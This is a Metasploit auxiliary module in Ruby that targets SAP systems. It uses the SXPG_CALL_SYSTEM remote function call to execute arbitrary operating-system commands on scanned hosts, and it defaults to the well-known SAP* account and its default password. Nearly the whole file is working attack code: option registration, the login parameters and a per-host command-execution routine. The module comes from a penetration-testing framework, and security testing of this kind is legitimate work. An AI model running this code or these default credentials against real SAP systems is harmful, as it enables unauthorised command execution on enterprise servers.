##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP RFC SXPG_CALL_SYSTEM',
      'Description' => %q{
        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection/' ]],
      'Author' => [ 'nmonkee' ],
      'License' => BSD_LICENSE,
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CMD', [true, 'Command', 'id']),
        OptEnum.new('OS', [true, 'Target OS','Linux',['Linux', 'Windows']])
      ], self.class)
  end

  def run_host(rhost)
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    opts = {
        :rhost => rhost,
        :rport => rport,
        :client => client,
        :user => user,
        :pass => password
    }

    res = dbmcli_sxpg_execute(datastore['OS'], datastore['CMD'], opts)

    print res
  end

end



